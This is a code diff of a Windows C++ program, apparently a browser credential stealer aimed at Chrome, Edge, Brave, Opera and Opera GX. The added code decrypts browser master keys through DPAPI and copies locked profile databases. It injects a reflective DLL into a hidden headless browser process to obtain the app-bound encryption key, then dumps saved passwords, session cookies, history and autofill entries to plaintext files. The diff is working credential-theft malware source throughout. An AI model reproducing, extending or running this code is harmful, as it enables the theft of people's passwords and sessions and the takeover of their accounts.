@@ -11,6 +11,9 @@
 #include <sstream>
 #include <cctype>
 #include <cwctype>
+#include <wincrypt.h>
+#include <bcrypt.h>
+#include "sqlite3.h"
 #include "bootstrapper.h"
 #include "json.hpp"
 
@@ -66,17 +69,152 @@ std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
     return ret;
 }
 
+std::vector<unsigned char> decrypt_dpapi(const std::vector<unsigned char>& data) {
+    DATA_BLOB input = { (DWORD)data.size(), (BYTE*)data.data() };
+    DATA_BLOB output = { 0, nullptr };
+    if (CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
+        std::vector<unsigned char> res(output.pbData, output.pbData + output.cbData);
+        LocalFree(output.pbData);
+        return res;
+    }
+    return {};
+}
+
+std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key, const std::vector<unsigned char>& data) {
+    if (data.size() < 15) return {};
+
+    BCRYPT_ALG_HANDLE h_alg = nullptr;
+    BCRYPT_KEY_HANDLE h_key = nullptr;
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
+    memset(&info, 0, sizeof(info));
+    info.cbSize = sizeof(info);
+    info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
+
+    if (BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0) return {};
+    if (BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) { BCryptCloseAlgorithmProvider(h_alg, 0); return {}; }
+
+    if (BCryptGenerateSymmetricKey(h_alg, &h_key, nullptr, 0, (BYTE*)key.data(), key.size(), 0) != 0) { BCryptCloseAlgorithmProvider(h_alg, 0); return {}; }
+
+    std::vector<unsigned char> nonce(data.begin() + 3, data.begin() + 15);
+    std::vector<unsigned char> ciphertext(data.begin() + 15, data.end() - 16);
+    std::vector<unsigned char> tag(data.end() - 16, data.end());
+
+    info.pbNonce = nonce.data();
+    info.cbNonce = nonce.size();
+    info.pbTag = tag.data();
+    info.cbTag = tag.size();
+
+    std::vector<unsigned char> plaintext(ciphertext.size());
+    DWORD cb_plain = 0;
+    if (BCryptDecrypt(h_key, ciphertext.data(), ciphertext.size(), &info, nullptr, 0, plaintext.data(), plaintext.size(), &cb_plain, 0) != 0) {
+        BCryptDestroyKey(h_key);
+        BCryptCloseAlgorithmProvider(h_alg, 0);
+        return {};
+    }
+
+    BCryptDestroyKey(h_key);
+    BCryptCloseAlgorithmProvider(h_alg, 0);
+    plaintext.resize(cb_plain);
+    return plaintext;
+}
+
+bool copy_file_locked(const fs::path& source, const fs::path& dest) {
+    for (int i = 0; i < 3; i++) {
+        HANDLE h_src = CreateFileW(source.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, 0, nullptr);
+        if (h_src != INVALID_HANDLE_VALUE) {
+            HANDLE h_dest = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
+            if (h_dest != INVALID_HANDLE_VALUE) {
+                char buffer[65536];
+                DWORD bytes_read, bytes_written;
+                bool has_data = false;
+                while (ReadFile(h_src, buffer, sizeof(buffer), &bytes_read, nullptr) && bytes_read > 0) {
+                    WriteFile(h_dest, buffer, bytes_read, &bytes_written, nullptr);
+                    has_data = true;
+                }
+                CloseHandle(h_src);
+                CloseHandle(h_dest);
+                if (has_data) return true;
+            } else {
+                CloseHandle(h_src);
+            }
+        }
+        Sleep(200);
+    }
+    return false;
+}
+
+std::string wstring_to_utf8(const std::wstring& wstr) {
+    if (wstr.empty()) return std::string();
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
+    std::string strTo(size_needed, 0);
+    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
+    return strTo;
+}
+
+std::string to_utf8_lossy(const std::vector<unsigned char>& input) {
+    std::string output;
+    output.reserve(input.size());
+    for (unsigned char c : input) {
+        if (c < 32 && c != '\r' && c != '\n' && c != '\t') {
+            output += ' ';
+        } else {
+            output += (char)c;
+        }
+    }
+    return output;
+}
+
+std::string ensure_utf8(const std::string& input) {
+    std::string output;
+    output.reserve(input.size());
+    for (unsigned char c : input) {
+        if (c < 32 && c != '\r' && c != '\n' && c != '\t') output += ' ';
+        else output += (char)c;
+    }
+    return output;
+}
+
+int open_db_readonly(const std::string& path, sqlite3** db) {
+    std::string uri = "file:" + path + "?mode=ro&nolock=1";
+    return sqlite3_open_v2(uri.c_str(), db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI | SQLITE_OPEN_NOMUTEX, nullptr);
+}
+
+struct PasswordData { std::string url, username, password; };
+struct CookieData {
+    std::string host, name, value, path;
+    long long expires_utc;
+    int is_secure, is_httponly, samesite;
+};
+struct HistoryData { std::string url, title; int visit_count; };
+struct AutofillData { std::string name, value; };
+struct ProfileData {
+    std::string name;
+    std::vector<PasswordData> passwords;
+    std::vector<CookieData> cookies;
+    std::vector<HistoryData> history;
+    std::vector<AutofillData> autofill;
+};
+
 struct BrowserConfig {
     std::wstring name;
     std::wstring exe_name;
     std::vector<std::wstring> common_paths;
+    std::wstring user_data_path;
 };
 
 const std::vector<BrowserConfig> BROWSERS = {
-    {L"Chrome", L"chrome.exe", {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"}},
-    {L"Edge", L"msedge.exe", {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"}},
-    {L"Brave", L"brave.exe", {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}}
+    {L"Chrome", L"chrome.exe", {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"}, L"%LOCALAPPDATA%\\Google\\Chrome\\User Data"},
+    {L"Edge", L"msedge.exe", {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"}, L"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"},
+    {L"Brave", L"brave.exe", {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}, L"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data"},
+    {L"Opera", L"launcher.exe", {L"%LOCALAPPDATA%\\Programs\\Opera\\launcher.exe", L"C:\\Program Files\\Opera\\launcher.exe"}, L"%APPDATA%\\Opera Software\\Opera Stable"},
+    {L"OperaGX", L"launcher.exe", {L"%LOCALAPPDATA%\\Programs\\Opera GX\\launcher.exe", L"C:\\Program Files\\Opera GX\\launcher.exe"}, L"%APPDATA%\\Opera Software\\Opera GX Stable"}
 };
+
+std::wstring expand_path(const std::wstring& path) {
+    wchar_t expanded[MAX_PATH];
+    ExpandEnvironmentStringsW(path.c_str(), expanded, MAX_PATH);
+    return std::wstring(expanded);
+}
 
 std::wstring find_browser_exe(const std::wstring& name) {
     for (const auto& b : BROWSERS) {
@@ -86,7 +224,8 @@ std::wstring find_browser_exe(const std::wstring& name) {
         std::transform(target_name_lower.begin(), target_name_lower.end(), target_name_lower.begin(), ::towlower);
         if (b_name_lower == target_name_lower) {
             for (const auto& path : b.common_paths) {
-                if (fs::exists(path)) return path;
+                std::wstring expanded = expand_path(path);
+                if (fs::exists(expanded)) return expanded;
             }
         }
     }
@@ -129,6 +268,136 @@ DWORD find_main_process(const std::wstring& exe_name) {
 
     CloseHandle(snapshot);
     return main_pid;
+}
+
+void extract_data_from_profile(const fs::path& p_path, const std::string& profile_name, const std::vector<unsigned char>& v10_key, const std::vector<unsigned char>& v20_key, ProfileData& p_data) {
+    p_data.name = profile_name;
+    fs::path temp_dir = fs::temp_directory_path() / "browser_extractor_tmp";
+    fs::create_directories(temp_dir);
+
+    // Passwords
+    fs::path db_path = p_path / "Login Data";
+    fs::path tmp_db = temp_dir / "pass.tmp";
+    if (fs::exists(db_path)) {
+        if (copy_file_locked(db_path, tmp_db)) {
+            sqlite3* db;
+            if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
+                sqlite3_stmt* stmt;
+                if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, nullptr) == SQLITE_OK) {
+                    while (sqlite3_step(stmt) == SQLITE_ROW) {
+                        const char* t_url = (const char*)sqlite3_column_text(stmt, 0);
+                        const char* t_user = (const char*)sqlite3_column_text(stmt, 1);
+                        std::string url = t_url ? t_url : "";
+                        std::string user = t_user ? t_user : "";
+                        const unsigned char* pass_blob = (const unsigned char*)sqlite3_column_blob(stmt, 2);
+                        int pass_len = sqlite3_column_bytes(stmt, 2);
+                        std::vector<unsigned char> enc_pass(pass_blob, pass_blob + pass_len);
+
+                        bool is_v20 = (enc_pass.size() > 3 && std::string((char*)enc_pass.data(), 3) == "v20");
+                        const std::vector<unsigned char>& key = is_v20 ? v20_key : v10_key;
+                        if (!key.empty()) {
+                            auto dec = aes_gcm_decrypt(key, enc_pass);
+                            if (!dec.empty()) {
+                                if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
+                                p_data.passwords.push_back({ url, user, to_utf8_lossy(dec) });
+                            }
+                        }
+                    }
+                    sqlite3_finalize(stmt);
+                }
+                sqlite3_close(db);
+            }
+        }
+        fs::remove(tmp_db);
+    }
+
+    // Cookies
+    db_path = p_path / "Network/Cookies";
+    if (!fs::exists(db_path)) db_path = p_path / "Cookies";
+    tmp_db = temp_dir / "cook.tmp";
+    if (fs::exists(db_path)) {
+        if (copy_file_locked(db_path, tmp_db)) {
+            sqlite3* db;
+            if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
+                sqlite3_stmt* stmt;
+                if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
+                    while (sqlite3_step(stmt) == SQLITE_ROW) {
+                        const char* t_host = (const char*)sqlite3_column_text(stmt, 0);
+                        const char* t_name = (const char*)sqlite3_column_text(stmt, 1);
+                        const char* t_path = (const char*)sqlite3_column_text(stmt, 2);
+                        std::string host = t_host ? t_host : "";
+                        std::string name = t_name ? t_name : "";
+                        std::string path = t_path ? t_path : "";
+                        long long expires = sqlite3_column_int64(stmt, 3);
+                        int secure = sqlite3_column_int(stmt, 4);
+                        int httponly = sqlite3_column_int(stmt, 5);
+                        int samesite = sqlite3_column_int(stmt, 6);
+
+                        const unsigned char* enc_blob = (const unsigned char*)sqlite3_column_blob(stmt, 7);
+                        int enc_len = sqlite3_column_bytes(stmt, 7);
+                        std::vector<unsigned char> enc_val(enc_blob, enc_blob + enc_len);
+
+                        bool is_v20 = (enc_val.size() > 3 && std::string((char*)enc_val.data(), 3) == "v20");
+                        const std::vector<unsigned char>& key = is_v20 ? v20_key : v10_key;
+                        if (!key.empty()) {
+                            auto dec = aes_gcm_decrypt(key, enc_val);
+                            if (!dec.empty()) {
+                                if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
+                                p_data.cookies.push_back({ host, name, to_utf8_lossy(dec), path, expires, secure, httponly, samesite });
+                            }
+                        }
+                    }
+                    sqlite3_finalize(stmt);
+                }
+                sqlite3_close(db);
+            }
+        }
+        fs::remove(tmp_db);
+    }
+
+    // History
+    db_path = p_path / "History";
+    tmp_db = temp_dir / "hist.tmp";
+    if (fs::exists(db_path)) {
+        if (copy_file_locked(db_path, tmp_db)) {
+            sqlite3* db;
+            if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
+                sqlite3_stmt* stmt;
+                if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &stmt, nullptr) == SQLITE_OK) {
+                    while (sqlite3_step(stmt) == SQLITE_ROW) {
+                        const char* t_url = (const char*)sqlite3_column_text(stmt, 0);
+                        const char* t_title = (const char*)sqlite3_column_text(stmt, 1);
+                        p_data.history.push_back({ t_url ? t_url : "", t_title ? t_title : "", sqlite3_column_int(stmt, 2) });
+                    }
+                    sqlite3_finalize(stmt);
+                }
+                sqlite3_close(db);
+            }
+        }
+        fs::remove(tmp_db);
+    }
+
+    // Autofill
+    db_path = p_path / "Web Data";
+    tmp_db = temp_dir / "web.tmp";
+    if (fs::exists(db_path)) {
+        if (copy_file_locked(db_path, tmp_db)) {
+            sqlite3* db;
+            if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
+                sqlite3_stmt* stmt;
+                if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, nullptr) == SQLITE_OK) {
+                    while (sqlite3_step(stmt) == SQLITE_ROW) {
+                        const char* t_name = (const char*)sqlite3_column_text(stmt, 0);
+                        const char* t_val = (const char*)sqlite3_column_text(stmt, 1);
+                        p_data.autofill.push_back({ t_name ? t_name : "", t_val ? t_val : "" });
+                    }
+                    sqlite3_finalize(stmt);
+                }
+                sqlite3_close(db);
+            }
+        }
+        fs::remove(tmp_db);
+    }
 }
 
 void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& dll_bytes) {
@@ -186,192 +455,139 @@ void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& d
 void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const BrowserConfig& browser) {
     std::wcout << L"\n--- Processing Browser: " << browser.name << L" ---" << std::endl;
 
-    DWORD existing_pid = find_main_process(browser.exe_name);
-    HANDLE h_process = NULL;
-    bool process_started_by_us = false;
-    PROCESS_INFORMATION pi = { 0 };
-
-    if (existing_pid != 0) {
-        std::wcout << L"Found existing " << browser.name << L" process (PID: " << existing_pid << L"). Injecting..." << std::endl;
-        h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, existing_pid);
+    fs::path data_path = expand_path(browser.user_data_path);
+    if (!fs::exists(data_path)) {
+        std::wcout << L"Data path not found: " << data_path.wstring() << std::endl;
+        return;
     }
 
-    if (!h_process) {
-        std::wcout << L"Starting new " << browser.name << L" process..." << std::endl;
-        std::wstring cmd = browser.exe_name + L" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
-        std::vector<wchar_t> cmd_buf(cmd.begin(), cmd.end());
-        cmd_buf.push_back(0);
+    std::string local_state_str;
+    std::ifstream ls_file(data_path / "Local State");
+    if (ls_file) local_state_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
 
-        STARTUPINFOW si = { sizeof(si) };
-        si.dwFlags = STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_HIDE;
+    json ls_json = json::parse(local_state_str, nullptr, false);
+    std::vector<unsigned char> v10_key, v20_key;
 
-        BOOL success = CreateProcessW(NULL, cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-        if (!success) {
-            std::wstring path = find_browser_exe(browser.name);
-            if (!path.empty()) {
-                std::wstring full_cmd = L"\"" + path + L"\" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
-                std::vector<wchar_t> full_cmd_buf(full_cmd.begin(), full_cmd.end());
-                full_cmd_buf.push_back(0);
-                success = CreateProcessW(NULL, full_cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-            }
-        }
-
-        if (success) {
-            h_process = pi.hProcess;
-            process_started_by_us = true;
-        } else {
-            std::wcerr << L"Failed to create or open " << browser.exe_name << L" process" << std::endl;
-            return;
+    if (!ls_json.is_discarded() && ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("encrypted_key")) {
+        std::string key_b64 = ls_json["os_crypt"]["encrypted_key"];
+        auto decoded = base64_decode(key_b64);
+        if (decoded.size() > 5 && std::string((char*)decoded.data(), 5) == "DPAPI") {
+            v10_key = decrypt_dpapi(std::vector<unsigned char>(decoded.begin() + 5, decoded.end()));
         }
     }
 
-    HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 50 * 1024 * 1024, 50 * 1024 * 1024, 0, NULL);
-    if (h_pipe == INVALID_HANDLE_VALUE) {
-        std::cerr << "Failed to create named pipe. Error: " << GetLastError() << std::endl;
+    std::string v20_b64;
+    if (!ls_json.is_discarded()) {
+        if (ls_json.contains("app_bound_encrypted_key")) v20_b64 = ls_json["app_bound_encrypted_key"];
+        else if (ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("app_bound_encrypted_key")) v20_b64 = ls_json["os_crypt"]["app_bound_encrypted_key"];
     }
 
-    inject_dll_reflective(h_process, dll_bytes);
-    if (process_started_by_us) ResumeThread(pi.hThread);
+    if (!v20_b64.empty()) {
+        std::wcout << L"App-Bound Encryption (v20) detected. Injecting..." << std::endl;
+        DWORD existing_pid = find_main_process(browser.exe_name);
+        HANDLE h_process = NULL;
+        bool process_started_by_us = false;
+        PROCESS_INFORMATION pi = { 0 };
 
-    if (h_pipe != INVALID_HANDLE_VALUE) {
-        std::cout << "Waiting for DLL connection..." << std::endl;
-        if (ConnectNamedPipe(h_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
-            std::cout << "DLL Connected successfully!" << std::endl;
-            std::vector<char> buffer;
-            char temp[65536];
-            DWORD bytes_read;
-            while (ReadFile(h_pipe, temp, sizeof(temp), &bytes_read, NULL) && bytes_read > 0) {
-                buffer.insert(buffer.end(), temp, temp + bytes_read);
-            }
+        if (existing_pid != 0) {
+            h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, existing_pid);
+        }
 
-            if (!buffer.empty()) {
-                std::cout << "Received " << buffer.size() << " bytes of data." << std::endl;
-                try {
-                    std::cout << "Parsing JSON data..." << std::endl;
-                    auto profiles = json::parse(buffer);
-                    fs::path browser_dir(browser.name);
-                    fs::create_directories(browser_dir);
-
-                    for (size_t i = 0; i < profiles.size(); ++i) {
-                        std::string p_name = profiles[i]["name"].get<std::string>();
-                        // Sanitize profile name for filesystem
-                        std::replace(p_name.begin(), p_name.end(), '/', '_');
-                        std::replace(p_name.begin(), p_name.end(), '\\', '_');
-                        std::replace(p_name.begin(), p_name.end(), ':', '_');
-
-                        fs::path profile_dir = browser_dir / p_name;
-                        fs::create_directories(profile_dir);
-
-                        std::string p_pass = (profile_dir / "passwords.txt").string();
-                        std::ofstream pass_file(p_pass);
-                        for (auto& p : profiles[i]["passwords"]) {
-                            pass_file << "URL: " << p["url"].get<std::string>() << "\nUser: " << p["username"].get<std::string>() << "\nPass: " << p["password"].get<std::string>() << "\n\n";
-                        }
-                        pass_file.close();
-
-                        std::string p_cook = (profile_dir / "cookies.txt").string();
-                        std::ofstream cookie_file(p_cook);
-                        json cookie_json_list = json::array();
-                        for (auto& c : profiles[i]["cookies"]) {
-                            std::string host = c["host"].get<std::string>();
-                            std::string name = c["name"].get<std::string>();
-                            std::string val = c["value"].get<std::string>();
-                            std::string path = c["path"].get<std::string>();
-                            long long exp_utc = c["expires_utc"].get<long long>();
-                            int secure = c["is_secure"].get<int>();
-                            int httponly = c["is_httponly"].get<int>();
-                            int samesite = c["samesite"].get<int>();
-
-                            cookie_file << "Host: " << host << " | Name: " << name << " | Value: " << val << "\n";
-
-                            // Format Cookie JSON
-                            json cj;
-                            std::string host_raw = host;
-                            if (host_raw.find("http") != 0) {
-                                if (host_raw[0] == '.') host_raw = "https://" + host_raw;
-                                else host_raw = "https://" + host_raw;
-                            }
-                            if (host_raw.back() != '/') host_raw += "/";
-
-                            cj["Host raw"] = host_raw;
-                            cj["Name raw"] = name;
-                            cj["Path raw"] = path;
-                            cj["Content raw"] = val;
-
-                            // Convert Webkit timestamp to Unix and Format Date
-                            long long unix_ts = (exp_utc / 1000000) - 11644473600LL;
-                            std::time_t t = (std::time_t)unix_ts;
-                            struct tm *tm_ptr = std::gmtime(&t);
-                            std::string date_str = "";
-                            if (tm_ptr) {
-                                std::ostringstream oss;
-                                oss << std::put_time(tm_ptr, "%d-%m-%Y %H:%M:%S");
-                                date_str = oss.str();
-                            }
-
-                            cj["Expires"] = date_str;
-                            cj["Expires raw"] = std::to_string(unix_ts);
-                            cj["Send for"] = secure ? "Encrypted connections only" : "Any type of connection";
-                            cj["Send for raw"] = secure ? "true" : "false";
-                            cj["HTTP only raw"] = httponly ? "true" : "false";
-
-                            std::string ss_str = "no_restriction";
-                            if (samesite == 1) ss_str = "lax";
-                            else if (samesite == 2) ss_str = "strict";
-                            cj["SameSite raw"] = ss_str;
-
-                            cj["This domain only"] = (host[0] == '.') ? "Valid for subdomains" : "Valid for host only";
-                            cj["This domain only raw"] = (host[0] == '.') ? "false" : "true";
-                            cj["First Party Domain"] = "";
-
-                            cookie_json_list.push_back(cj);
-                        }
-                        cookie_file.close();
-
-                        std::ofstream(profile_dir / "cookies.json") << cookie_json_list.dump(4);
-                        std::ofstream(profile_dir / "passwords.json") << profiles[i]["passwords"].dump(4);
-                        std::ofstream(profile_dir / "history.json") << profiles[i]["history"].dump(4);
-                        std::ofstream(profile_dir / "autofill.json") << profiles[i]["autofill"].dump(4);
-
-                        std::string p_hist = (profile_dir / "history.txt").string();
-                        std::ofstream hist_file(p_hist);
-                        for (auto& h : profiles[i]["history"]) {
-                            hist_file << "URL: " << h["url"].get<std::string>() << " | Title: " << h["title"].get<std::string>() << " | Visits: " << h["visit_count"].get<int>() << "\n";
-                        }
-                        hist_file.close();
-
-                        std::string p_auto = (profile_dir / "autofill.txt").string();
-                        std::ofstream auto_file(p_auto);
-                        for (auto& a : profiles[i]["autofill"]) {
-                            auto_file << "Name: " << a["name"].get<std::string>() << " | Value: " << a["value"].get<std::string>() << "\n";
-                        }
-                        auto_file.close();
-
-                        std::cout << "[+] Saved " << profiles[i]["passwords"].size() << " passwords to: " << p_pass << std::endl;
-                        std::cout << "[+] Saved " << profiles[i]["cookies"].size() << " cookies to: " << p_cook << std::endl;
-                    }
-                } catch (const std::exception& e) {
-                    std::cerr << "JSON Parsing error: " << e.what() << std::endl;
-                } catch (...) {
-                    std::cerr << "Unknown error during JSON parsing." << std::endl;
+        if (!h_process) {
+            std::wstring browser_path = find_browser_exe(browser.name);
+            if (!browser_path.empty()) {
+                std::wstring cmd = L"\"" + browser_path + L"\" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
+                std::vector<wchar_t> cmd_buf(cmd.begin(), cmd.end());
+                cmd_buf.push_back(0);
+                STARTUPINFOW si = { sizeof(si) };
+                si.dwFlags = STARTF_USESHOWWINDOW;
+                si.wShowWindow = SW_HIDE;
+                if (CreateProcessW(NULL, cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+                    h_process = pi.hProcess;
+                    process_started_by_us = true;
                 }
-            } else {
-                std::cout << "Pipe closed with no data received." << std::endl;
             }
-        } else {
-            std::cerr << "ConnectNamedPipe failed. Error: " << GetLastError() << std::endl;
         }
-        CloseHandle(h_pipe);
+
+        if (h_process) {
+            HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 65536, 65536, 0, NULL);
+            inject_dll_reflective(h_process, dll_bytes);
+            if (process_started_by_us) ResumeThread(pi.hThread);
+
+            if (ConnectNamedPipe(h_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
+                unsigned char buffer[256];
+                DWORD bytes_read;
+                if (ReadFile(h_pipe, buffer, sizeof(buffer), &bytes_read, NULL) && bytes_read > 0) {
+                    v20_key.assign(buffer, buffer + bytes_read);
+                    std::cout << "v20 key received from DLL (" << v20_key.size() << " bytes)." << std::endl;
+                }
+            }
+            CloseHandle(h_pipe);
+
+            if (process_started_by_us) {
+                TerminateProcess(h_process, 0);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+            } else {
+                CloseHandle(h_process);
+            }
+        }
+    } else {
+        std::wcout << L"Using DPAPI (v10) decryption." << std::endl;
     }
 
-    Sleep(1000); // Give the OS time to finish pipe work
-    if (process_started_by_us) {
-        TerminateProcess(pi.hProcess, 0);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    } else {
-        CloseHandle(h_process);
+    if (v10_key.empty() && v20_key.empty()) {
+        std::cerr << "Failed to obtain any master key for " << wstring_to_utf8(browser.name) << std::endl;
+        return;
+    }
+
+    std::vector<std::string> profiles;
+    if (fs::exists(data_path / "Login Data") || fs::exists(data_path / "Cookies")) {
+        profiles.push_back("."); // Current directory is the profile (Opera)
+    }
+
+    if (fs::exists(data_path / "Default")) {
+        profiles.push_back("Default");
+    }
+
+    for (const auto& entry : fs::directory_iterator(data_path)) {
+        if (entry.is_directory() && entry.path().filename().string().find("Profile ") == 0) {
+            profiles.push_back(entry.path().filename().string());
+        }
+    }
+
+    fs::path browser_dir(wstring_to_utf8(browser.name));
+    fs::create_directories(browser_dir);
+
+    for (const auto& profile : profiles) {
+        std::cout << "[*] Extracting data from profile: " << profile << std::endl;
+        ProfileData p_data;
+        std::string p_name = (profile == ".") ? "RootProfile" : profile;
+        extract_data_from_profile(data_path / profile, p_name, v10_key, v20_key, p_data);
+
+        std::string safe_profile_name = p_name;
+        std::replace(safe_profile_name.begin(), safe_profile_name.end(), ' ', '_');
+        fs::path profile_dir = browser_dir / safe_profile_name;
+        fs::create_directories(profile_dir);
+
+        // Save results
+        std::ofstream(profile_dir / "passwords.txt") << "Passwords:\n";
+        std::ofstream pass_file(profile_dir / "passwords.txt", std::ios::app);
+        for (const auto& p : p_data.passwords) pass_file << "URL: " << p.url << "\nUser: " << p.username << "\nPass: " << p.password << "\n\n";
+
+        std::ofstream(profile_dir / "cookies.txt") << "Cookies:\n";
+        std::ofstream cook_file(profile_dir / "cookies.txt", std::ios::app);
+        for (const auto& c : p_data.cookies) cook_file << "Host: " << c.host << " | Name: " << c.name << " | Value: " << c.value << "\n";
+
+        std::ofstream(profile_dir / "history.txt") << "History:\n";
+        std::ofstream hist_file(profile_dir / "history.txt", std::ios::app);
+        for (const auto& h : p_data.history) hist_file << "URL: " << h.url << " | Title: " << h.title << "\n";
+
+        std::ofstream(profile_dir / "autofill.txt") << "Autofill:\n";
+        std::ofstream auto_file(profile_dir / "autofill.txt", std::ios::app);
+        for (const auto& a : p_data.autofill) auto_file << "Name: " << a.name << " | Value: " << a.value << "\n";
+
+        std::cout << "[+] Saved " << p_data.passwords.size() << " passwords and " << p_data.cookies.size() << " cookies." << std::endl;
     }
 }
 
